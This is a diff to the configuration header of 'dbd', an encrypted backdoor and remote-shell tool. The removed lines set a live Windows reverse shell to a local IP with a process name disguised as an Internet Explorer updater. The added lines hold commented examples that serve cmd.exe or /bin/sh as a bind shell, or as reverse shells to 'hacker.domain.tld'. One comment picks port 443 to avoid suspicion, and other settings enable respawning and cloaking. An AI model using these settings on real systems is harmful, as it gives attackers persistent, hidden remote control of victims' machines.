@@ -3,24 +3,22 @@
  * or type in your own. when finished, recompile dbd.
  */
 
-/* ATAT Windows Reverse Shell Settings*/
+/* these are the default values, change to suite your taste */
 
-#define HOST "192.168.1.67"
-#define PORT 455
+#define HOST NULL
 #define BINDHOST NULL
+#define PORT 0
 #define SOURCE_PORT 0
 #define DOLISTEN 0
-#define EXECPROG "cmd.exe"
+#define EXECPROG NULL
 #define CONVERT_TO_CRLF 0
 #define ENCRYPTION 1
-#define SHARED_SECRET "testtest"
+#define SHARED_SECRET "lulzsecpwnsj00"
 #define RESPAWN_ENABLED 1
 #define RESPAWN_INTERVAL 600
 #define QUIET 1
 #define VERBOSE 0
 #define DAEMONIZE 1
-#define RUN_ONLY_ONE_INSTANCE 0
-#define INSTANCE_SEMAPHORE "iexplorer_update_polling_agent"
 
 /* Romulan Cloaking Technology - MUST DEFINE ALL OPTIONS IN THIS HEADER
  * When set to 1, this option will change argv[0] (and therefore the process's
@@ -41,4 +39,47 @@
 
 #define RUN_ONLY_ONE_INSTANCE 0
 #define INSTANCE_SEMAPHORE "durandal_bd_semaphore"
+
+
+/* some examples: */
+
+/* listen for incoming connection on port 1234, serve "cmd.exe" to the
+ * connecting party. when disconnected, dbd will immediately re-bind the port
+ * and listen for another connection...
+ */
+/*
+#define DOLISTEN 1
+#define PORT 1234
+#define RESPAWN_ENABLED 1
+#define EXECPROG "cmd.exe"
+*/
+
+/* connect to hacker.domain.tld on port 443 and serve "cmd.exe". we hardcode
+ * "something else" into dbd as our aes-128 encryption pass phrase (encryption
+ * is on per default in dbd). we use port 443 (https) since https traffic is
+ * encrypted, which means our activity won't be that suspicious. DAEMONIZE 1
+ * means that we're going to detach from the console (under win32).
+ */
+/*
+#define DOLISTEN 0
+#define HOST "hacker.domain.tld"
+#define PORT 443
+#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 1800
+#define EXECPROG "cmd.exe"
+#define SHARED_SECRET "something else"
+#define DAEMONIZE 1
+*/
+
+/* connect to hacker.domain.tld on port 993 (imaps) and serve /bin/sh.
+ * reconnect every 2 hours.
+ */
+/*
+#define DOLISTEN 0
+#define HOST "hacker.domain.tld"
+#define PORT 993
+#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 7200
+#define EXECPROG "/bin/sh"
+*/
 
